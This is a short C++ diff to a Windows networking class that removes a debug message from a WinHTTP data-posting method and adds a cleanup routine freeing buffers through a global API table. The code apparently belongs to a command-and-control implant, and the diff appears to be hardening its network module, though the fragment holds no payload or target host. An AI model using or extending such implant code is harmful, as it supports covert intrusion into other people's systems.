@@ -79,7 +79,6 @@ BOOL NetMgr::Post( PBYTE data, SIZE_T DataSize ) {
 	DWORD avail = 0, total = 0, read = 0;
 	BOOL sent = FALSE;
 
-	DEBUG_LOG("[+] Posting Data...");
 
 	hSession = this->apis.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
 		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
@@ -123,6 +122,19 @@ NEXT:
 }
 
 
+
+void NetMgr::Cleanup() {
+	PBYTE recv = this->RecvBuf;
+	this->RecvBuf = NULL;
+	this->recvLen = 0;
+	this->recvCap = 0;
+
+	NetMgr* self = this;
+	net = NULL;
+	kratos->apis.LocalFree( recv );
+	kratos->apis.LocalFree( self );
+	return;
+}
 
 
 PBYTE NetMgr::Data( ) {
